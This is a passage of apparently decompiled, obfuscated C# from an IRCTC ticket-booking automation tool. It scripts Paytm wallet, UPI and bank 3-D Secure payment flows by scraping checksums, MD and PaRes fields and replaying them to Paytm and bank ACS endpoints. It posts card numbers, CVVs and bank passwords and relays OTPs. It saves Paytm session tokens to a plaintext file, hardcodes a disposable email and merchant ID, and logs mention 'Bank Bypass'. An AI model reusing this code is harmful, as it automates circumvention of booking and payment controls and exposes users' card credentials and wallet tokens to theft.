                                            text11 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + num + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string2 + "\",\"workFlow\":\"enhancedCashierFlow\"},\"body\":{\"paymentMode\":\"BALANCE\",\"paymentFlow\":\"NONE\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + string3 + "\",\"orderId\":\"" + string4 + "\"}}";
                                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                                            {
                                                clsMain.Lock("First Hit Failed. err = " + string_99);
                                                string_91 = "Paytm Gateway not working - Payment Failed";
                                                return false;
                                            }
                                            clsMain.Lock("Success ProcessPAYTM_Getways_PAYTM");
                                            if (string_100.Contains("Success"))
                                            {
                                                string_90 = string_100;
                                                string_91 = string_92;
                                                bool_13 = true;
                                                return true;
                                            }
                                            string_91 = "Paytm Gateway not working - Payment Failed";
                                            return false;
                                        }
                                        continue;
                                    }
                                    clsMain.Lock("Invaild Bank Bypass Detail, First Hit Failed. err = " + string_99);
                                    string_91 = "Invaild Bank Bypass Detail, Paytm Gateway not working - Payment Failed";
                                    if (clsMain.list_7.Contains(item))
                                    {
                                        clsMain.list_7.Remove(item);
                                    }
                                    return false;
                                }
                                if (clsMain.list_7.Contains(item))
                                {
                                    clsMain.list_7.Remove(item);
                                }
                                string_90 = "00000";
                                string_91 = "00000";
                                return false;
                            }
                            clsMain.Lock("OTP Cancel");
                            if (clsMain.list_7.Contains(item))
                            {
                                clsMain.list_7.Remove(item);
                            }
                            updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                            return false;
                        }
                        if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI"))
                        {
                            string string7 = GetString(string_100, "TXN_AMOUNT");
                            string string8 = GetString(string_100, "transId");
                            string string9 = GetString(string_100, "cashierRequestId");
                            dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                            num = (long)(DateTime.UtcNow - dateTime).TotalMilliseconds;
                            string_93 = "https://securegw.paytm.in/theia/upi/transactionStatus?MID=" + string3 + "&orderId=" + string4;
                            text11 = "merchantId=" + string3 + "&orderId=" + string4 + "&transId=" + string8 + "&paymentMode=UPI&cashierRequestId=" + string9;
                            string text22 = string7.Split('.')[0];
                            if (string_88.Contains("BHIMUPI") || string_88.Contains("PTMBHIMUPI"))
                            {
                                if (Convert.ToBoolean(Environment.GetEnvironmentVariable("UPI_AUTO")))
                                {
                                    frmUPI.payStart = true;
                                }
                            }
                            else
                            {
                                updateTStatus_1.BeginInvoke(1, "Click ON Pay By PHONEPE APP", tCntrlName_, null, null);
                            }
                            DateTime dateTime2 = DateTime.Now.AddSeconds(62.0);
                            do
                            {
                                Thread.Sleep(1000);
                                if (DateTime.Now > dateTime2)
                                {
                                    break;
                                }
                                if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_99, ref webException_0))
                                {
                                    clsMain.Lock("Getting payment out error= " + string_99);
                                    return false;
                                }
                            }
                            while (string_99.Contains("POLL_AGAIN"));
                            if (string_99.Contains("POLL_AGAIN"))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                return false;
                            }
                            text11 = "cashierRequestId=" + string9 + "&paymentMode=UPI&vpaID=" + HttpUtility.UrlEncode(text3) + "&isSelfPush=false&upiAccepted=true&upiStatusUrl=" + HttpUtility.UrlEncode(string_93) + "&upiHandleInfo=%5Bobject+Object%5D&selfPush=false&merchantId=" + string3 + "&ORDER_ID=" + string4 + "&transId=" + string8 + "&TXN_AMOUNT=" + string7 + "&STATUS_INTERVAL=5000&STATUS_TIMEOUT=300000&MERCHANT_VPA=Transport-paytm%40icici";
                            string_93 = "https://securegw.paytm.in/theia/transactionStatus?MID=" + string3 + "&orderId=" + string4;
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("First Hit Failed. err = " + string_99);
                                string_91 = "Paytm Gateway not working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("Success ProcessPAYTM_Getways_BHIMUPI");
                            updateTStatus_1.BeginInvoke(1, "Process UPI_Getway SUCCESS", tCntrlName_, null, null);
                            string_90 = string_100;
                            string_91 = string_92;
                            return true;
                        }
                        bool flag3 = false;
                        try
                        {
                            bool_13 = true;
                            if (string_100.Contains("ipg-online.com"))
                            {
                                method_164(ref string_100, string_93, cookieContainer_, string_94, ref string_91);
                            }
                            string text23 = text7;
                            switch (Class46.smethod_0(text23))
                            {
                                case 1748227631u:
                                    if (!(text23 == "101"))
                                    {
                                    }
                                    break;
                                case 883554812u:
                                    if (text23 == "571")
                                    {
                                        flag3 = method_148(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 873244444u:
                                    if (text23 == "1")
                                    {
                                        CookieContainer cookieContainer_2 = null;
                                        if (!(flag3 = SbiNetBanking(string_100, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2, ref cookieContainer_2)) && cookieContainer_2 != null)
                                        {
                                            ThreadPool.QueueUserWorkItem(method_110, cookieContainer_2);
                                        }
                                    }
                                    break;
                                case 2296612630u:
                                    if (text23 == "41")
                                    {
                                        flag3 = method_107(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2246132678u:
                                    if (text23 == "52")
                                    {
                                        flag3 = method_117(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2314228892u:
                                    if (text23 == "36")
                                    {
                                        flag3 = HdfcPAYTM(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2313243154u:
                                    if (text23 == "56")
                                    {
                                        flag3 = method_138(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2363723106u:
                                    if (text23 == "45")
                                    {
                                        flag3 = method_120(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2330020773u:
                                    if (text23 == "57")
                                    {
                                        flag3 = method_150(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2380500725u:
                                    if (text23 == "44")
                                    {
                                        flag3 = method_116(string_100, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2364708844u:
                                    if (text23 == "21")
                                    {
                                        flag3 = method_174(string_100, string_93, cookieContainer_, string_95, ref string_90, ref string_91);
                                    }
                                    break;
                                case 2515707415u:
                                    if (text23 == "28")
                                    {
                                        flag3 = method_136(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 2431672225u:
                                    if (text23 == "39")
                                    {
                                        flag3 = method_105(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 3805092650u:
                                    if (text23 == "911")
                                    {
                                        flag3 = method_151(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                                case 3672151626u:
                                    if (text23 == "999")
                                    {
                                        flag3 = method_147(string_100, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                    }
                                    break;
                            }
                        }
                        catch
                        {
                        }
                        if (!flag3)
                        {
                            return false;
                        }
                        string_100 = string_90;
                        if (string_90.Contains("ipg-online.com"))
                        {
                            method_164(ref string_90, string_93, cookieContainer_, string_94, ref string_91);
                        }
                        if (string_90.Contains("//secure.paytm.in"))
                        {
                            string_92 = string_91;
                            text11 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            if (string_93.IndexOf("https://secure.paytm.in/") != 0)
                            {
                                string_93 = "https://secure.paytm.in/oltp/HANDLER_WEB_RESP/" + text + text2 + "/USRPWD";
                            }
                            clsMain.Lock("Third Hit Inp = " + text11);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                        }
                        if (string_90.Contains("//securegw.paytm.in"))
                        {
                            updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(4/5)", tCntrlName_, null, null);
                            string_92 = string_91;
                            if (text7 == "999")
                            {
                                if (string_90.Contains("cashierRequestId"))
                                {
                                    text11 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                }
                                if (string_90.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                                {
                                    string text24 = string_90.Substring(string_90.IndexOf("method=\"post\" action=") + 22);
                                    string_93 = text24.Substring(0, text24.IndexOf("\""));
                                    text24 = string_90.Substring(string_90.IndexOf("name=\"MD\" value=") + 17);
                                    string value2 = text24.Substring(0, text24.IndexOf("\""));
                                    string text25 = string_90.Substring(string_90.IndexOf("PaRes") + 14);
                                    text25 = text25.Substring(0, text25.IndexOf("\""));
                                    text11 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                    text11 = "MD=" + WebUtility.UrlEncode(value2) + "&PaRes=" + WebUtility.UrlEncode(text25);
                                }
                                else
                                {
                                    string text26 = string_90.Substring(string_90.IndexOf("method=\"post\" action=") + 22);
                                    string_93 = text26.Substring(0, text26.IndexOf("\""));
                                    text26 = string_90.Substring(string_90.IndexOf("name=\"MD\" value=") + 17);
                                    string text27 = text26.Substring(0, text26.IndexOf("\""));
                                    text26 = string_90.Substring(string_90.IndexOf("name=\"PaRes\" value=") + 20);
                                    string value3 = text26.Substring(0, text26.IndexOf("\""));
                                    text11 = "MD=" + text27 + "&PaRes=" + WebUtility.UrlEncode(value3);
                                }
                            }
                            else
                            {
                                text11 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            }
                            if (string_93.IndexOf("https://securegw.paytm.in/") != 0)
                            {
                                string_93 = "https://securegw.paytm.in/instaproxy/bankresponse/" + text + "/" + text2 + "/RESP";
                            }
                            clsMain.Lock("Third Hit Inp = " + text11);
                            if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_99);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                            string_90 = string_100;
                            if (clsMain.LoginType == "APP")
                            {
                                value = "www.irctc.co.in/eticketing/mbi/MobileBankResponse";
                            }
                            if (string_90.Contains("https://securegw.paytm.in") && !string_90.Contains(value))
                            {
                                updateTStatus_1.BeginInvoke(1, "Process PAYTM_Getway(5/5)", tCntrlName_, null, null);
                                text11 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                clsMain.Lock("Third Hit Inp = " + text11);
                                if (!_Request(string_93, text11, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_100, ref string_99, ref webException_0))
                                {
                                    clsMain.Lock("Third Hit Failed. err = " + string_99);
                                    string_91 = "Gateway Not Working - Payment Failed";
                                    return false;
                                }
                            }
                            string_90 = string_100;
                        }
                        clsMain.Lock("Third Output htm = " + string_100);
                        if (string_100.IndexOf(value, StringComparison.CurrentCultureIgnoreCase) <= 0)
                        {
                            string_91 = "Error Occured while Making Payment!";
                            clsMain.Lock(string_91 + ", Check HTML");
                            return false;
                        }
                        clsMain.Lock("Success ProcessCC_PTM");
                        string_90 = string_100;
                        string_91 = string_92;
                        result = true;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessCC_PTM", ex.Message);
                    result = false;
                }
                return result;
            }
            string_91 = "Some thing went wrong with Credit Card Payment";
            clsMain.Lock("Html doesn't contains paytm, returning.");
            return false;
        }

        private bool Multi_PaytmPayApp(string A_1, string A_2, string A_3, string A_4, ref string A_5, ref string A_6, UpdateTStatus A_7)
        {
            bool flag = !clsMain.isAPP;
            A_5 = "";
            A_6 = "";
            string text = "";
            string text2 = "";
            A_3 = A_3.ToUpper();
            bool flag2 = !A_1.Contains("paytm");
            bool result = false;
            string text3 = "PPI";
            string string_ = class3_0.string_18;
            string[] array = A_2.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text4 = array[0].Trim();
            string text5 = array[1];
            string text6 = "";
            string text7 = "";
            string text8 = "";
            string path = "Paytm_jx" + text4 + ".lgn";
            string text9 = "";
            string text10 = "";
            string text11 = "";
            string text12 = "";
            try
            {
                string text15;
                string text16;
                string text18;
                string text14;
                string text17;
                if (text3 == "PPI")
                {
                    response = A_1;
                    updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                    text = "zogun@coldemail.info";
                    string text13 = response.Substring(response.IndexOf("amount") + 9);
                    text2 = text13.Substring(0, text13.IndexOf("\""));
                    text14 = response.Substring(response.IndexOf("MID") + 14);
                    text12 = text14.Substring(0, text14.IndexOf("\""));
                    text14 = response.Substring(response.IndexOf("ORDER_ID") + 19);
                    text11 = text14.Substring(0, text14.IndexOf("\""));
                    text14 = response.Substring(response.IndexOf("CUST_ID") + 18);
                    text10 = text14.Substring(0, text14.IndexOf("\""));
                    text14 = response.Substring(response.IndexOf("MSISDN") + 17);
                    text9 = text14.Substring(0, text14.IndexOf("\""));
                    text9 = "";
                    url = "https://secure.paytm.in:443/oltp/HANDLER_INTERNAL/BANK_LIST?JsonData={\"INDUSTRY\":\"GovtUtility\",\"MID\":\"" + text12 + "\",\"CHANNEL\":\"WAP\"}";
                    postdata = "CUST_ID=";
                    url = "https://secure.paytm.in/oltp/HANDLER_INTERNAL/GET_POST_CONVENIENCE_FEE_MAP";
                    postdata = "JsonData={\"BASE_AMOUNT\":\"" + text2 + "\",\"INDUSTRY\":\"GovtUtility\",\"CHANNEL_ID\":\"WAP\",\"PAYMENT_MODE\":\"\",\"AUTH_MODE\":\"\",\"DISABLED_PAYMENT_MODE\":\"\",\"MID\":\"" + text12 + "\"}";
                    text15 = "";
                    text16 = "";
                    text17 = "";
                    text18 = "";
                    if (text3 == "PPI")
                    {
                        postdata = "MID=" + text12 + "&OTP_DELIVERY_METHOD=SMS&PHONE=" + text4 + "&RESPONSE_TYPE=token&SCOPE=paytm,txn&USER_TYPE=01";
                        url = "https://www.irctc.co.in/eticketing/mbi/PaytmWtGen";
                        if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            return false;
                        }
                        if (array.Length > 3)
                        {
                            text15 = array[2];
                            text16 = array[3];
                        }
                        else
                        {
                            if (File.Exists(path))
                            {
                                string text19 = File.ReadAllText(path);
                                if (!string.IsNullOrEmpty(text19))
                                {
                                    string[] array2 = text19.Split(new string[1] { "$" }, StringSplitOptions.None);
                                    text4 = array2[0];
                                    text15 = array2[1];
                                    text16 = array2[2];
                                    goto IL_0918;
                                }
                                File.Delete(path);
                            }
                            updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                            text14 = response.Substring(response.IndexOf("CHECKSUMHASH") + 15);
                            text14 = text14.Substring(0, text14.IndexOf("\""));
                            text17 = WebUtility.UrlEncode(text14).Trim();
                            text17 = text17.Replace("%5Cn", "%0A");
                            url = "https://secure.paytm.in:443/oltp/HANDLER_INTERNAL/GENERATE_OTP";
                            postdata = "JsonData={\"CHECKSUM\":\"" + text17 + "\",\"MID\":\"" + text12 + "\",\"OTP_DELIVERY_METHOD\":\"SMS\",\"PHONE\":\"" + text4 + "\",\"RESPONSE_TYPE\":\"token\",\"SCOPE\":\"paytm,txn\",\"USER_TYPE\":\"01\"}";
                            _Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0);
                            string text20 = response.Substring(response.IndexOf("state>") + 6);
                            text20 = text20.Substring(0, text20.IndexOf("<"));
                            do
                            {
                                string text21 = "";
                                frmOTP frmOTP = new frmOTP();
                                frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "PayTM OTP", class3_0.BANKSAVEAS);
                                if (frmOTP.DialogResult != DialogResult.OK)
                                {
                                    frmOTP.Dispose();
                                    return false;
                                }
                                text21 = frmOTP.string_0;
                                frmOTP.Dispose();
                                url = "https://secure.paytm.in/oltp/HANDLER_INTERNAL/VALIDATE_OTP";
                                postdata = "JsonData={\"MID\":\"" + text12 + "\",\"OTP\":\"" + text21 + "\",\"STATE\":\"" + text20 + "\"}";
                                _Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0);
                            }
                            while (response.Contains("Invalid Code"));
                            string text22 = response.Substring(response.IndexOf("PAYTM_TOKEN>") + 12);
                            text15 = text22.Substring(0, text22.IndexOf("<"));
                            string text23 = response.Substring(response.IndexOf("TXN_TOKEN>") + 10);
                            text16 = text23.Substring(0, text23.IndexOf("<"));
                            if (!File.Exists(path))
                            {
                                File.WriteAllText(path, text4 + "$" + text15 + "$" + text16);
                            }
                        }
                        goto IL_0918;
                    }
                    if (A_3.ToUpper().Contains("_DC") | A_3.ToUpper().Contains("_CC"))
                    {
                        reff = url;
                        url = "https://secure.paytm.in/oltp/HANDLER_INTERNAL/CARD_TOKEN_GENERATOR";
                        postdata = "CUST_ID=" + text10 + "&MID=" + text12 + "&CARD_EXPIRY_MONTH=" + text5 + "&CARD_EXPIRY_YEAR=" + text6 + "&CARD_NUMBER=" + text4 + "&CVV=" + text8;
                        if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            return false;
                        }
                        text14 = response.Substring(response.IndexOf("TOKEN") + 8);
                        text18 = text14.Substring(0, text14.IndexOf("\""));
                        postdata = "MSISDN=" + text9 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&PAYMENT_DETAILS=" + text18 + "&AUTH_MODE=3D&MID=" + text12 + "&EMAIL=" + WebUtility.UrlEncode(text) + "&THEME=merchant&PAYMENT_TYPE_ID=DC&CUST_ID=" + text11 + "&WEBSITE=IRCTCNWAP&ORDER_ID=" + text11;
                    }
                    else
                    {
                        postdata = "MSISDN=" + text9 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&AUTH_MODE=USRPWD&MID=" + text12 + "&EMAIL=" + WebUtility.UrlEncode(text) + "&THEME=merchant&BANK_CODE=" + text3 + "&PAYMENT_TYPE_ID=NB&CUST_ID=" + text11 + "&WEBSITE=IRCTCNWAP&ORDER_ID=" + text11;
                    }
                    goto IL_0aab;
                }
                goto IL_08e5;
            IL_08e5:
                if (response.Contains("https://www.irctc.co.in/eticketing/mbi/"))
                {
                    A_6 = url;
                    A_5 = response;
                    result = true;
                }
                goto end_IL_00c6;
            IL_0918:
                url = "https://trust.paytm.in:443/wallet-web/checkBalance";
                postdata = "";
                clsMain.string_71 = "ssotoken#" + text15;
                _Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0);
                if (response.Contains("amount"))
                {
                    double num = Convert.ToDouble(text2);
                    string text24 = response.Substring(response.IndexOf("amount") + 8);
                    string value = text24.Substring(0, text24.IndexOf(","));
                    double num2 = Convert.ToDouble(value);
                    if (num2 < num)
                    {
                        clsMain.bool_52 = true;
                        return false;
                    }
                }
                url = "https://www.irctc.co.in/eticketing/mbi/PaytmWtGen";
                clsMain.string_71 = "ssotoken#" + text15;
                postdata = "MSISDN=" + text4 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&SSO_TOKEN=" + text15 + "&PAYTM_TOKEN=" + text16 + "&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&PAYMENT_DETAILS=&AUTH_MODE=USRPWD&MID=" + text12 + "&EMAIL=" + text + "&THEME=merchant&PAYMENT_TYPE_ID=PPI&CUST_ID=" + text11 + "&WEBSITE=IRCTApWAP&ORDER_ID=" + text11;
                goto IL_0aab;
            IL_0aab:
                url = "https://www.irctc.co.in/eticketing/mbi/PaytmWtGen";
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    return false;
                }
                text14 = response.Substring(response.IndexOf("CHECKSUMHASH") + 15);
                text14 = text14.Substring(0, text14.IndexOf("\"")).Trim();
                text17 = WebUtility.UrlEncode(text14).Replace("%5Cn", "%0A");
                if (text3 == "PPI")
                {
                    postdata = "MSISDN=" + text4 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&SSO_TOKEN=" + text15 + "&PAYTM_TOKEN=" + text16 + "&CHECKSUMHASH=" + text17 + "&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&PAYMENT_DETAILS=&AUTH_MODE=USRPWD&MID=" + text12 + "&EMAIL=" + WebUtility.UrlEncode(text) + "&THEME=merchant&payt_STATUS=1&PAYMENT_TYPE_ID=PPI&CUST_ID=" + text11 + "&WEBSITE=IRCTApWAP&ORDER_ID=" + text11;
                }
                else if (A_3.ToUpper().Contains("_DC") | A_3.ToUpper().Contains("_CC"))
                {
                    postdata = "MSISDN=" + text9 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&CHECKSUMHASH=" + text17 + "&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&PAYMENT_DETAILS=" + text18 + "&AUTH_MODE=3D&MID=" + text12 + "&EMAIL=" + WebUtility.UrlEncode(text) + "&THEME=merchant&payt_STATUS=1&PAYMENT_TYPE_ID=DC&CUST_ID=" + text11 + "&WEBSITE=IRCTCNWAP&ORDER_ID=" + text11;
                }
                else
                {
                    postdata = "MSISDN=" + text9 + "&INDUSTRY_TYPE_ID=GovtUtility&CHANNEL_ID=WAP&CHECKSUMHASH=" + text17 + "&REQUEST_TYPE=PAYTM_EXPRESS&TXN_AMOUNT=" + text2 + "&AUTH_MODE=USRPWD&MID=IRCTCn13407115805523&EMAIL=" + WebUtility.UrlEncode(text) + "&THEME=merchant&payt_STATUS=1&BANK_CODE=" + text3 + "&PAYMENT_TYPE_ID=NB&CUST_ID=" + text11 + "&WEBSITE=IRCTCNWAP&ORDER_ID=" + text11;
                }
                updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                url = "https://secure.paytm.in/oltp-web/processTransaction";
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    return false;
                }
                if (response.IndexOf("<strong>Something went wrong. It may be due to any of these reasons:</strong>") > 0)
                {
                    return false;
                }
                if (response.IndexOf("https://www.irctc.co.in/eticketing/mbi/") <= 0)
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, true);
                    postdata = method_162(postdata);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        return false;
                    }
                    if (response.IndexOf("<strong>Something went wrong. It may be due to any of these reasons:</strong>") > 0)
                    {
                        return false;
                    }
                    if (response.IndexOf("https://www.irctc.co.in/eticketing/mbi/") > 0 && (!(text3 == "PPI") || response.IndexOf("'RESPMSG' value='Txn Success'") <= 0) && response.IndexOf("BANKTXNID' value=''") > 0)
                    {
                        flag = false;
                        A_6 = "Change Bank Getways";
                        if (response.IndexOf("Payment failed due to a technical error") > 0)
                        {
                            A_6 = "cHECK pAYTM bALANCE, Payment failed due to a technical error. Please try after some time.";
                        }
                        return flag;
                    }
                }
                goto IL_08e5;
            end_IL_00c6:;
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        private bool method_147(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            string string_91 = "https://secure.paytm.in/";
            string text = "";
            string string_92 = "";
            string string_93 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            array[0].Trim();
            string text2 = array[3];
            try
            {
                updateTStatus_1.BeginInvoke(1, "Process HDFC_Getway(1/2)", tCntrlName_, null, null);
                text = GetString(string_86, "callbackUrl");
                string @string = GetString(string_86, "PaReq");
                string string2 = GetString(string_86, "MD");
                string string3 = GetString(string_86, "TermUrl");
                string text3;
                if (string2.Contains("_______"))
                {
                    text3 = "MD=" + WebUtility.UrlEncode(string2) + "&PaReq=" + WebUtility.UrlEncode(@string) + "&TermUrl=" + WebUtility.UrlEncode(string3);
                    text3 = text3.Replace("%5Cn", "%0D%0A");
                }
                else
                {
                    text3 = "MD=" + string2 + "&PaReq=" + HttpUtility.UrlEncode(@string) + "&TermUrl=" + WebUtility.UrlEncode(string3);
                }
                bool_51 = true;
                clsMain.Lock("First Hit Failed. err = " + text3);
                if (!_Request(text, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "Process HDFC_Getway(2/2)", tCntrlName_, null, null);
                bool_51 = true;
                text3 = class3_0.Method_SerialInp(string_93, ref text, false);
                text3 = clsPostData.SetPost(text3, "txtPassword", text2);
                text3 = text3 + "&txtPassword=" + text2;
                text = "https://hdfc-acs.wibmo.com" + text;
                clsMain.Lock("First Hit Failed. err = " + text3);
                if (!_Request(text, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                clsMain.Lock("second Hit success = " + string_93);
                string_89 = string_93;
                string_90 = text;
                result = true;
                return true;
            }
            catch
            {
                return result;
            }
        }

        private bool method_148(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            string string_91 = "https://secure.paytm.in/";
            string text = "";
            string text2 = "";
            string string_92 = "";
            string string_93 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            string_87.Split(new string[1] { "||" }, StringSplitOptions.None)[0].Trim();
            try
            {
                updateTStatus_1.BeginInvoke(1, "Getway(1/3)", tCntrlName_, null, null);
                string @string = GetString(string_86, "MD");
                string string2 = GetString(string_86, "PaReq");
                string string3 = GetString(string_86, "TermUrl");
                string text3 = string3;
                string3 = HttpUtility.UrlEncode(string3);
                clsMain.Lock("First Hit Failed. err = " + text2);
                text = "https://acs2.onlinesbi.com/bdacs/SBIValidate/M";
                text2 = "MD=" + @string + "&PaReq=" + HttpUtility.UrlEncode(string2) + "&TermUrl=" + string3;
                if (!method_87(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                response = string_93;
                string text4 = string_93.Substring(string_93.IndexOf("ENTermUrl") + 33);
                text4 = text4.Substring(0, text4.IndexOf("\""));
                string text5 = string_93.Substring(string_93.IndexOf("accountid") + 33);
                text5 = text5.Substring(0, text5.IndexOf("\""));
                string text6 = string_93.Substring(string_93.IndexOf("txnrefno") + 32);
                text6 = text6.Substring(0, text6.IndexOf("\""));
                string2 = string_93.Substring(string_93.IndexOf("PaReq") + 25);
                string2 = string2.Substring(0, string2.IndexOf("\""));
                string text7 = string_93.Substring(string_93.IndexOf("ENMD") + 23);
                text7 = text7.Substring(0, text7.IndexOf("\""));
                frmOTP frmOTP = new frmOTP();
                frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, false, "SBI_DC OTP", class3_0.BANKSAVEAS);
                if (frmOTP.DialogResult != DialogResult.OK)
                {
                    frmOTP.Dispose();
                    clsMain.Lock("OTP Cancel");
                    updateTStatus_1.BeginInvoke(2, "OTP Cancelled By User", tCntrlName_, null, null);
                    return false;
                }
                string string_94 = frmOTP.string_0;
                frmOTP.Dispose();
                updateTStatus_1.BeginInvoke(1, "Process (2/3)", tCntrlName_, null, null);
                clsMain.Lock("First Hit Failed. err = " + text2);
                text = "https://acs2.onlinesbi.com/bdacs/SBIValidate/SBIValidate?reqid=M003";
                string_91 = "https://acs2.onlinesbi.com/bdacs/SBIValidate/M";
                text2 = "customerpin=" + string_94 + "&Status=otp&ENTermUrl=" + text4 + "&accountid=" + text5 + "&txnrefno=" + text6 + "&PaReq=" + HttpUtility.UrlEncode(string2) + "&ENMD=" + text7;
                if (!method_87(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
